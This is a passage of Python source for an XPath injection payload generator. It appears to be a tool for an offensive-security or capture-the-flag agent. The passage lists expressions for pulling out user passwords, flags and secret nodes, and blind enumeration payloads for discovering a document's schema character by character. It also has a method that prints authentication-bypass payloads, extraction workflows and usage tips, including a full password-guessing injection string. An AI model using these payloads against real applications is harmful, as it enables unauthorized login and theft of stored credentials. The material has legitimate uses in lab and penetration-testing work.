        },
        {
            "expression": "//user[1]/pass",
            "description": "First user's pass field",
        },
        {
            "expression": "//user[1]/name",
            "description": "First user's name",
        },
        {
            "expression": "//user[1]/username",
            "description": "First user's username",
        },
        {
            "expression": "//user[position()=1]/password",
            "description": "First user's password (explicit position)",
        },
        {
            "expression": "//flag",
            "description": "Flag node (if exists)",
        },
        {
            "expression": "//secret",
            "description": "Secret node (if exists)",
        },
        {
            "expression": "//*[contains(name(),'pass')]",
            "description": "Any node with 'pass' in its name",
        },
        {
            "expression": "//*[contains(name(),'flag')]",
            "description": "Any node with 'flag' in its name",
        },
    ]

    # Enumeration payloads for schema discovery
    ENUMERATION_PAYLOADS: List[Dict[str, str]] = [
        {
            "payload": "count(//*)={n}",
            "description": "Count total nodes in document",
            "usage": "Binary search: test different values of {n}",
        },
        {
            "payload": "count(//*[1]/*)={n}",
            "description": "Count child nodes of root's first child",
            "usage": "Determine structure depth",
        },
        {
            "payload": "count(//user)={n}",
            "description": "Count user nodes",
            "usage": "Determine number of user entries",
        },
        {
            "payload": "name(//*[1])='{name}'",
            "description": "Get name of first element",
            "usage": "Extract root element name character by character",
        },
        {
            "payload": "name(//*[{n}])='{name}'",
            "description": "Get name of nth element",
            "usage": "Enumerate element names",
        },
        {
            "payload": "string-length(name(//*[1]))={len}",
            "description": "Length of first element's name",
            "usage": "Determine name length before extracting",
        },
        {
            "payload": "substring(name(//*[1]),{pos},1)='{char}'",
            "description": "Extract first element name character by character",
            "usage": "Blind extraction of node names",
        },
        {
            "payload": "count(//*[1]/child::*)={n}",
            "description": "Count children of first element",
            "usage": "Understand document structure",
        },
        {
            "payload": "name(//*[1]/*[{n}])='{name}'",
            "description": "Get name of nth child of first element",
            "usage": "Enumerate child element names",
        },
        {
            "payload": "string-length(//*[{n}])={len}",
            "description": "Length of nth element's text content",
            "usage": "Determine value length before extraction",
        },
        {
            "payload": "substring(name(//*[1]/*[{n}]),{pos},1)='{char}'",
            "description": "Extract nth child element name character by character",
            "usage": "Full blind enumeration of schema",
        },
        {
            "payload": "count(//*[1]/@*)={n}",
            "description": "Count attributes of first element",
            "usage": "Check for attribute-based data",
        },
        {
            "payload": "name(//*[1]/@*[{n}])='{name}'",
            "description": "Get name of nth attribute of first element",
            "usage": "Enumerate attribute names",
        },
    ]

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[XPathPayloadGenerator] Error: Invalid JSON input. {exc}"

        operation = data.get("operation", "").strip()
        if not operation:
            return (
                "[XPathPayloadGenerator] Error: 'operation' is required. "
                "Must be 'auth_bypass', 'data_extraction', or 'enumeration'."
            )

        if operation not in ("auth_bypass", "data_extraction", "enumeration"):
            return (
                f"[XPathPayloadGenerator] Error: Invalid operation '{operation}'. "
                "Must be 'auth_bypass', 'data_extraction', or 'enumeration'."
            )

        output_lines = [
            f"[XPathPayloadGenerator] XPath Injection Payloads",
            "=" * 50,
            f"Operation: {operation}",
            "",
        ]

        if operation == "auth_bypass":
            output_lines.append("=== Authentication Bypass Payloads ===")
            output_lines.append("")

            for i, entry in enumerate(self.AUTH_BYPASS_PAYLOADS, 1):
                output_lines.append(f"{i}. {entry['description']}")
                output_lines.append(f"   Context: {entry['context']}")
                output_lines.append(f"   Payload: {entry['payload']}")
                output_lines.append("")

            output_lines.append("=== Usage Tips ===")
            output_lines.append("1. Try payloads in both username and password fields")
            output_lines.append("2. If single quotes are filtered, try double-quote variants")
            output_lines.append("3. If parentheses are in the query, use parenthesized payloads")
            output_lines.append("4. Observe response differences to detect injection")
            output_lines.append("5. Some apps use XPath like: //user[name='INPUT' and pass='INPUT']")
            output_lines.append("   In that case, username payload may need to close the and clause")

        elif operation == "data_extraction":
            output_lines.append("=== Blind Boolean Extraction Templates ===")
            output_lines.append("")

            for entry in self.DATA_EXTRACTION_TEMPLATES:
                output_lines.append(f"Template: {entry['template']}")
                output_lines.append(f"  Description: {entry['description']}")
                output_lines.append(f"  Usage: {entry['usage']}")
                output_lines.append("")

            output_lines.append("=== Common XPath Expressions to Extract ===")
            output_lines.append("")
            for entry in self.COMMON_EXPRESSIONS:
                output_lines.append(f"  {entry['expression']}")
                output_lines.append(f"    -> {entry['description']}")
            output_lines.append("")

            output_lines.append("=== Extraction Workflow ===")
            output_lines.append("1. Determine string length: string-length(EXPR)>N")
            output_lines.append("2. Binary search each character: substring(EXPR,POS,1)>'X'")
            output_lines.append("3. Or use xpath_blind_boolean tool with operation='extract_string'")
            output_lines.append("")
            output_lines.append("=== Full Payload Example ===")
            output_lines.append(
                "  ' or substring(//user[1]/password,1,1)='a' or '1'='1"
            )
            output_lines.append(
                "  (Tests if first char of first user's password is 'a')"
            )

        elif operation == "enumeration":
            output_lines.append("=== Schema Enumeration Payloads ===")
            output_lines.append("")

            for entry in self.ENUMERATION_PAYLOADS:
                output_lines.append(f"Payload: {entry['payload']}")
                output_lines.append(f"  Description: {entry['description']}")
                output_lines.append(f"  Usage: {entry['usage']}")
                output_lines.append("")

            output_lines.append("=== Enumeration Workflow ===")
            output_lines.append("1. Count total nodes: count(//*)=N")
            output_lines.append("2. Get root element name: name(//*[1])='X'")
            output_lines.append("3. Count children: count(//*[1]/*)=N")
            output_lines.append("4. Get child names: name(//*[1]/*[1])='X'")
            output_lines.append("5. Extract values: substring(//*[1]/*[1],POS,1)='X'")
            output_lines.append("")
            output_lines.append("=== Tips ===")
            output_lines.append("1. Start with count() to understand document size")
            output_lines.append("2. Use name() to discover element names")
            output_lines.append("3. Use string-length() before extracting values")
            output_lines.append("4. Look for elements named 'flag', 'secret', 'password'")
            output_lines.append("5. Check for attributes with count(@*)")

        return "\n".join(output_lines)
